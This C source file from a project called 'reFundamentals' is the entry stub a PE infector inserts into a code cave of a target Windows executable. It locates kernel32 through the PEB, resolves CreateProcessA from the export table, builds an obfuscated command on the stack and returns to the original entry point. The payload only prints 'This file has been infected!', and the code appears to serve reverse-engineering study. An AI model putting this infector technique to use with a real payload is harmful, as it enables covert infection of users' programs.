//
// reFundamentals
// Copyright (c) 2019 Adam Podlosky
//
// Stub that is inserted into a code-cave within the target executable.
//

#define _WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "infector.h"
#include "nt_internal.h"

//
// Type definitions for Windows API functions
//

typedef VOID (WINAPI *PFN_ENTRY)(VOID);

typedef BOOL (WINAPI *PFN_CREATEPROCESSA)(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation);

//
// Pack both CreateProcessA information structures together to zero easier
//
typedef struct {
    STARTUPINFOA            startup;
    PROCESS_INFORMATION     process;
} CREATEPROC_INFOA;

//
// Entry-point for infected executable.
//
void __stdcall EntryPoint(void)
{
    PEB                     *peb;
    LIST_ENTRY              *entry;
    DWORD                   cmd[16];
    HMODULE                 moduleBase;
    LDR_DATA_TABLE_ENTRY    *moduleData;
    CREATEPROC_INFOA        info;
    PFN_CREATEPROCESSA      pCreateProcessA;
    IMAGE_DOS_HEADER       *dosHdr;
    IMAGE_NT_HEADERS       *ntHdr;
    IMAGE_EXPORT_DIRECTORY *expDir;
    DWORD                  i;
    DWORD                  ordinal;
    DWORD                  *tblFuncs;
    DWORD                  *tblNames;
    WORD                   *tblOrds;
    CHAR                   *p;
    DWORD                  *p4;
    WORD                   *p2;

#ifdef _WIN64
    peb = (PEB *)__readgsqword(0x60);
#else
    peb = (PEB *)__readfsdword(0x30);
#endif
    // Depending on the version of Windows, kernel32 has NOT always been
    // the third entry in the memory module list.
    //
    // Windows 2000    : (?), also who cares?
    // Windows XP      : app.exe, kernel32
    // Windows Vista   : (?)
    // Windows 7 and up: app.exe, ntdll, kernel32

    // TODO: write "smallest" way to search by BaseDllName (wide char string),
    // also base name can be lower-case or upper-case, depending on OS version.
    // Probably calculate a simple hash of the string like shellcode often does.
    entry = peb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink;
    moduleData = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    moduleBase = (HMODULE)moduleData->DllBase;

    // Walk kernel32.dll's export table
    dosHdr = (IMAGE_DOS_HEADER *)moduleBase;
    ntHdr = RVA_TO_PTR(moduleBase, dosHdr->e_lfanew);
    expDir = RVA_TO_PTR(moduleBase, ntHdr->OptionalHeader.DataDirectory
        [IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    tblNames = RVA_TO_PTR(moduleBase, expDir->AddressOfNames);

    for (i = 0; i < expDir->NumberOfNames; i++) {
        p = RVA_TO_PTR(moduleBase, tblNames[i]);
        p2 = (WORD *)p;
		p4 = (DWORD *)p;

        // 'CreateProcessA' check null since CreateProcessAsUserA would match
		if ((p4[0] == 'aerC') &&
            (p4[1] == 'rPet') &&
            (p4[2] == 'seco') &&
            (p2[6] == 'As') &&
            (p[14] == '\0')) {

            tblOrds = RVA_TO_PTR(moduleBase, expDir->AddressOfNameOrdinals);
            ordinal = tblOrds[i];
			tblFuncs = RVA_TO_PTR(moduleBase, expDir->AddressOfFunctions);
            pCreateProcessA = (PFN_CREATEPROCESSA)RVA_TO_PTR(moduleBase, tblFuncs[ordinal]);
            goto successFoundProc;
        }
    }

    // Could not find CreateProcessA, bail out to OEP
    goto errorNotFound;

successFoundProc:
    // Build cmd-line string on stack
    // cmd.exe /c "echo This file has been infected! & echo. & pause"
    cmd[0] = '.dmc';
    cmd[1] = ' exe';
    cmd[2] = '" c/';
    cmd[3] = 'ohce';
    cmd[4] = 'ihT ';
    cmd[5] = 'if s';
    cmd[6] = 'h el';
    cmd[7] = 'b sa';
    cmd[8] = ' nee';
    cmd[9] = 'efni';
    cmd[10] = 'detc';
    cmd[11] = ' & !';
    cmd[12] = 'ohce';
    cmd[13] = ' & .';
    cmd[14] = 'suap';
    cmd[15] = '"e';

    // Zero STARTUPINFOA and PROCESS_INFORMATION structures
    __stosb(&info, 0, sizeof(info));
    info.startup.cb = sizeof(info.startup);

    pCreateProcessA(
        NULL,
        (char *)&cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &info.startup,
        &info.process);

errorNotFound:
    // Compiler will generate useless code if either of these inline assembly
    // blocks are included since this function is not declared __declspec(naked).
    // Also the MSVC x64 does not support inline assembly.Easier to compile
    // with '/FA' and edit assembly listing afterwards.

    //__asm {
    //    push OEP_DUMMY
    //    retn
    //}

    // Call dummy address that will be replaced with OEP
    ((PFN_ENTRY)OEP_DUMMY)();

    // TODO: could use "peb->ImageBaseAddress + OEP" to support ASLR
    //((PFN_ENTRY)((UINT_PTR)peb->ImageBaseAddress + OEP_DUMMY))();

    //__asm {
    //    mov eax, peb->ImageBaseAddress
    //    add eax, OEP_DUMMY
    //    push eax
    //    retn
    //}
}
